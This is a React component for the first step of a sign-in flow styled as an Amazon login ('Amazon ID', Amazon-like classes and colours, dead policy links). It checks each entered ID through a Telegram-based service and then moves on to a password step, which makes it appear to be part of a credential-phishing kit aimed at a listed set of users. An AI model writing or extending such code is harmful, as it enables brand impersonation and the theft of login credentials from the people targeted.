import { useState, useRef, useEffect } from 'react';
import { useAuth } from '../store/authStore';
import { checkAmazonId } from '../services/telegram';
import gsap from 'gsap';

export default function Step1AmazonID() {
  const { goToStep, updateData, setError, error } = useAuth();
  const [amazonId, setAmazonId] = useState('');
  const [localError, setLocalError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const stepRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (stepRef.current) {
      gsap.fromTo(
        stepRef.current,
        { opacity: 0, x: 30 },
        { opacity: 1, x: 0, duration: 0.3, ease: 'power2.out' }
      );
    }
  }, []);

  const validate = (value: string): boolean => {
    if (!value.trim()) {
      setLocalError('Enter your username or email address');
      return false;
    }
    // Basic email or username validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const usernameRegex = /^[a-zA-Z0-9_.-]{3,}$/;
    
    if (!emailRegex.test(value) && !usernameRegex.test(value)) {
      setLocalError('Enter a valid username or email address');
      return false;
    }
    return true;
  };

  const extractFirstName = (id: string): string => {
    if (id.includes('@')) {
      return id.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, (c) => c.toUpperCase());
    }
    return 'User';
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLocalError('');
    setError(null);

    if (!validate(amazonId)) return;

    setIsLoading(true);

    const isAllowed = await checkAmazonId(amazonId);
    
    if (!isAllowed) {
      setIsLoading(false);
      setLocalError('This username is not in the verification process');
      return;
    }

    const firstName = extractFirstName(amazonId);
    updateData({ amazonId: amazonId.trim(), firstName });
    setIsLoading(false);

    if (stepRef.current) {
      gsap.to(stepRef.current, {
        opacity: 0,
        x: -30,
        duration: 0.25,
        ease: 'power2.in',
        onComplete: () => goToStep('step2-password'),
      });
    }
  };

  return (
    <div ref={stepRef}>
      <h1 className="step-heading">Sign in to ECS Warehouse</h1>
      <form onSubmit={handleSubmit} noValidate>
        <div className="mb-3">
          <label className="amazon-label" htmlFor="amazon-id">
            Username or email (Amazon ID)
          </label>
          <input
            id="amazon-id"
            type="text"
            className={`amazon-input ${localError || error ? 'error' : ''}`}
            placeholder="Enter your Amazon ID or username"
            value={amazonId}
            onChange={(e) => {
              setAmazonId(e.target.value);
              setLocalError('');
              setError(null);
            }}
            autoComplete="email"
            autoFocus
          />
          {(localError || error) && (
            <p className="error-text">{localError || error}</p>
          )}
        </div>
        <button type="submit" className="btn-amazon" disabled={isLoading}>
          {isLoading ? <div className="spinner" style={{ width: 16, height: 16, borderWidth: 2 }} /> : 'Continue'}
        </button>
      </form>

      <div className="mt-4 flex items-center gap-3">
        <div className="flex-1 h-px bg-[#E7E7E7]" />
        <span className="text-[11px] text-[#565959]">New to ECS Warehouse?</span>
        <div className="flex-1 h-px bg-[#E7E7E7]" />
      </div>

      <div className="mt-3 text-center">
        <a href="#" className="amazon-link" onClick={(e) => e.preventDefault()}>
          Create your Amazon ID
        </a>
      </div>

      <div className="mt-6 pt-4 border-t border-[#E7E7E7] flex justify-center gap-4 text-[11px] text-[#565959]">
        <a href="#" className="hover:text-[#0F1111] hover:underline" onClick={(e) => e.preventDefault()}>
          Conditions of Use
        </a>
        <a href="#" className="hover:text-[#0F1111] hover:underline" onClick={(e) => e.preventDefault()}>
          Privacy Notice
        </a>
        <a href="#" className="hover:text-[#0F1111] hover:underline" onClick={(e) => e.preventDefault()}>
          Help
        </a>
      </div>
    </div>
  );
}
